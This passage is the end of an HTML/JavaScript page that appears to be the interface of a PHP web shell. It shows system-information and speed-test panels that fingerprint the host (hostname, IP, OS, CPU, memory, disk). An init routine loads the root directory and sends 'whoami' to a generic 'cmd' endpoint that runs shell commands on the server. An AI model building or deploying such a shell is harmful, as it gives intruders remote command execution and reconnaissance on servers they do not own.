    $('fileContent').innerHTML = '<div class="grid"><div class="card" id="benchSys"><h3><i class="fas fa-server" style="color:var(--blue)"></i> System Info</h3><div class="loading"><i class="fas fa-spinner fa-spin"></i></div></div><div class="card" id="benchSpeed"><h3><i class="fas fa-tachometer-alt" style="color:var(--red)"></i> Speed Test</h3><div class="loading"><i class="fas fa-spinner fa-spin"></i></div></div></div>';
    api('benchmark',{action:'sysinfo'},function(res){
        var h='';
        if(res.hostname) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Host:</span><span>'+esc(res.hostname)+' ('+res.ip+')</span></div>';
        if(res.os) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">OS:</span><span style="font-size:10px">'+esc(res.os)+'</span></div>';
        if(res.php) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">PHP:</span><span>'+res.php+'</span></div>';
        if(res.server) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Server:</span><span>'+esc(res.server)+'</span></div>';
        if(res.uptime) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Uptime:</span><span>'+esc(res.uptime)+'</span></div>';
        if(res.load) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Load:</span><span>'+res.load+'</span></div>';
        if(res.cpu_cores) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">CPU Cores:</span><span>'+res.cpu_cores+'</span></div>';
        if(res.cpu_model) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">CPU:</span><span style="font-size:10px">'+esc(res.cpu_model)+'</span></div>';
        if(res.mem_total) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Memory:</span><span>'+res.mem_total+' (avail: '+res.mem_avail+')</span></div>';
        if(res.disk_total) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Disk:</span><span>'+res.disk_free+' free / '+res.disk_total+' ('+res.disk_pct+'% used)</span></div>';
        $('benchSys').innerHTML = '<h3><i class="fas fa-server" style="color:var(--blue)"></i> System Info</h3>'+h;
    });
    api('benchmark',{action:'speed'},function(res){
        var h='';
        if(res.string_ops) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">1MB String:</span><span>'+res.string_ops+'</span></div>';
        if(res.sort_100k) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">Sort 100k:</span><span>'+res.sort_100k+'</span></div>';
        if(res.md5_10k) h+='<div class="flex mb-8"><span style="width:100px;color:var(--muted)">MD5 10k:</span><span>'+res.md5_10k+'</span></div>';
        $('benchSpeed').innerHTML = '<h3><i class="fas fa-tachometer-alt" style="color:var(--red)"></i> Speed Test</h3>'+h;
    });
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
   INIT
   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
window.onload = function() {
    loadDir(ROOT);
    api('cmd',{c:IS_WIN?'whoami':'whoami 2>/dev/null'},function(r){if(r.output)$('serverInfo').textContent=r.output.trim().substring(0,60);});
};
</script>
</body>
</html>
